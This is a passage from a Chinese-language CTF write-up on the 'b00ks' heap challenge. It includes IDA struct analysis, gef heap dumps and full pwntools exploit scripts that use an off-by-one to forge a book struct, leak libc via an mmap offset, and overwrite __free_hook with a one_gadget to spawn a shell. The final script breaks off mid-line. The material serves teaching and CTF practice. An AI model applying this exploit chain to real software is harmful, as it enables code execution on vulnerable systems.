<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">book + <span class="number">0x18</span>h = desc_szie</span><br><span class="line">book + <span class="number">0x8</span>h =  name指针</span><br><span class="line">book + <span class="number">0x10</span>h = desc 指针</span><br><span class="line">book + <span class="number">0x0</span>h = <span class="type">int</span> number</span><br></pre></td></tr></table></figure>
<p>可见ida的反汇编结果不太准确。book结构体正确的偏移应该是。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="number">-4</span> <span class="type">int</span></span><br><span class="line"><span class="number">8</span><span class="number">-16</span> ptr</span><br><span class="line"><span class="number">16</span><span class="number">-24</span> ptr</span><br><span class="line"><span class="number">24</span><span class="number">-28</span> <span class="type">int</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id; </span><br><span class="line">    <span class="type">char</span> *name; <span class="comment">//因为对齐会占到8</span></span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125; book;</span><br></pre></td></tr></table></figure>
<p>在ida中创建结构体</p>
<p><img src="image21.png" alt=""></p>
<p><img src="image22.png" alt=""></p>
<p><img src="image23.png" alt=""></p>
<p>这下就对味了, malloc完堆布局如下。</p>
<p><img src="image24.png" alt=""></p>
<h2 id="细说利用-泄漏libc地址">细说利用 (泄漏libc地址)</h2>
<p>bookshelf数组里面放着第一个book的指针 (0x0000555555603710)</p>
<p><img src="image25.png" alt=""></p>
<p>Bookshelf和off_202018(author name相邻)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.data:0000000000202010 bookshelf       dq offset unk_202060    ; DATA XREF: check_space:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete_book:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: edit_author_name+<span class="number">15</span>↑o</span><br><span class="line">.data:0000000000202018                                         ; list_book+CA↑o</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=<span class="number">0x555555603010</span>, size=<span class="number">0x290</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x0000555555603010</span>     <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    ................]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556032a0</span>, size=<span class="number">0x410</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556032a0</span>     <span class="number">33</span> <span class="number">32</span> 0a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="number">32.</span>.............]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556036b0</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556036b0</span>     <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    aaaaaaaaaa......]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556036e0</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556036e0</span>     <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    bbbbbbbbbb......]</span><br><span class="line">Chunk(addr=<span class="number">0x555555603710</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x0000555555603710</span>     01 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> b0 <span class="number">36</span> <span class="number">60</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>    ........<span class="number">.6</span>`UUU..]</span><br><span class="line">Chunk(addr=<span class="number">0x555555603740</span>, size=<span class="number">0x208d0</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk</span><br><span class="line">gef➤  x /1xg <span class="number">0x555555602010</span></span><br><span class="line"><span class="number">0x555555602010</span>:        <span class="number">0x0000555555602060</span></span><br><span class="line">gef➤  x /2xg <span class="number">0x0000555555602060</span></span><br><span class="line"><span class="number">0x555555602060</span>:        <span class="number">0x0000555555603710</span>        <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p><img src="image26.png" alt=""></p>
<p>可以利用off-by-one把bookshelf的第一个指针最后一位覆盖为\x00。</p>
<p>如果我们可以把bookshelf抬高到上面description的位置，那么我们就可以提前在descripton里面伪造好book结构体的数据。</p>
<ul>
<li>然后触发edit book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址写的目的。</li>
<li>然后触发list book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址读的目的。</li>
</ul>
<p>这里需要倒推一下，不考虑地址随机化(ASLR)的话，malloc第一个book的name时，堆顶是0x5555556036b0 - 0x8（从prev_size开始算）</p>
<p><img src="image27.png" alt=""></p>
<p>不考虑ASLR如果name malloc 64字节，desc malloc 32字节。那么实际上book ptr的地址会是</p>
<p>0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10</p>
<p>= 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10</p>
<p>= 0x5555556036b0 + 0x50 + 0x30 = 0x555555603730</p>
<p>0x555555603730置0成0x555555603700刚好就是book1 description的地址。</p>
<p>更通行通法的来讲，应该再下面这个约束里面找一个解就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + request2size(Y) + <span class="number">0x10</span></span><br><span class="line">(addr &amp; ~(<span class="number">0x100</span> - <span class="number">0x1</span>)) == <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + <span class="number">0x10</span></span><br><span class="line">request2size(Y) &gt;= size(book) </span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">8</span>  <span class="comment"># 64位系统上 size_t 的大小  </span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">15</span>  <span class="comment"># 16字节对齐掩码 (0xF)  </span></span><br><span class="line">MINSIZE = <span class="number">32</span>  <span class="comment"># 假设的最小块大小  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request2size</span>(<span class="params">req</span>):  </span><br><span class="line">    <span class="keyword">if</span> req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE:  </span><br><span class="line">        <span class="keyword">return</span> MINSIZE  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> Y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65</span>):</span><br><span class="line">        addr = <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + request2size(Y) + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (addr &amp; ~(<span class="number">0x100</span> - <span class="number">0x1</span>)) == <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + <span class="number">0x10</span> <span class="keyword">and</span> request2size(Y) &gt;= <span class="number">28</span>):</span><br><span class="line">            <span class="built_in">print</span>(X, Y)</span><br></pre></td></tr></table></figure>
<p>可以跑出来很多结果，我们随便挑一对验证。比如（57, 10）-&gt; 其实在后面还会发现第二个为了放payload还是需要更长一点。</p>
<p><img src="image28.png" alt=""></p>
<p>0x555555603720 -&gt; addr=0x555555603700回到description</p>
<p>PS: 看起来这个题目我目前只malloc了小内存块不超过0x1000所以没有跨内存页的问题，如果heap地址在ASLR的情况下其实地址按0x1000对齐也不影响？</p>
<p>现在已经知道可以读写任意地址了，但是这个题开了ASLR仍然不是知道libc的基地址。在PWN里面知道基地址是非常核心的一步，因为后面无论是覆盖free_hook或者别的地址，又或是找<a href="https://blog.csdn.net/weixin_62675330/article/details/123274386">onegadget</a>都需要它。</p>
<p>这里泄漏的基地址方法是在book中使用非常大的size迫使malloc使用mmap来分配内存， <strong>mmap分配的内存和libc基地址有一个固定偏移</strong> 。我们只需要在book1中description字段构造一个fake book让他指向book2的description或者name之一就能再调用list book就能泄漏mmap地址进而通过固定地址偏移计算出libc地址。</p>
<p>至于为什么有这个所谓的“固定偏移”，我看网上的wp都是一笔带过（no offence）。</p>
<p><img src="image29.png" alt=""></p>
<p><img src="image30.png" alt=""></p>
<p>翻了一点kernel源码看，基本搞懂了原理，写在下面<strong>附 固定地址原理</strong></p>
<p><img src="image31.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span>  </span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br></pre></td></tr></table></figure>
<p><img src="image32.png" alt=""></p>
<p>这里还有一个小困惑，为什么libc-2.31.so被加载进来了这多次。</p>
<p><img src="image33.png" alt=""></p>
<p><img src="image34.png" alt=""></p>
<p>在本地调试的时候发现，chunk地址是0x00007fdcf6db5010，0x00007fdcf6d94010。我们就用第二个来算吧，libc相对description的固定偏移是0x7fdcf6dd6000 - 0x00007fdcf6d94010 = 0x41ff0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>验证一下是对的</p>
<p><img src="image35.png" alt=""></p>
<h2 id="细说利用-onegadget-getshell">细说利用 (onegadget getshell)</h2>
<p>Libc base已经泄露了，下一步就是edit fake book1中指向book2的desc的地方改成free_hook地址，这样在edit book2的时候就可以覆盖free hook地址的内容为one gadget地址。然后在delete book的时候就会触发free hook的one gadget获取到shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ one_gadget -f /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 <span class="keyword">is</span> a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 <span class="keyword">is</span> a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 <span class="keyword">is</span> a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx <span class="keyword">is</span> a valid envp</span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi <span class="keyword">is</span> a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx <span class="keyword">is</span> a valid envp</span><br></pre></td></tr></table></figure>
<p>这种覆盖hook类方法的原理是在进入free之前会先看是否有自定义的free_hook函数如果有的话，就会直接用这个free hook而不会进入libc标准的free流程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br></pre></td></tr></table></figure>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span>  </span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#把author覆盖满</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造一个堆块，使他指向book2的堆块， book1_addr + 0x30，因为这个chunk在用所以0x30直接包含了prev_size的字段</span></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">0x8</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">0x8</span> + <span class="number">0x8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = p64(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line">one_gadget = p64(libc_base + <span class="number">0xe3afe</span>) <span class="comment"># 0xe3afe + 0xe3b01 + 0xe3b04</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one gadget: &quot;</span> + <span class="built_in">hex</span>(libc_base + <span class="number">0xe3afe</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book2</span></span><br><span class="line">io.recvuntil(<span 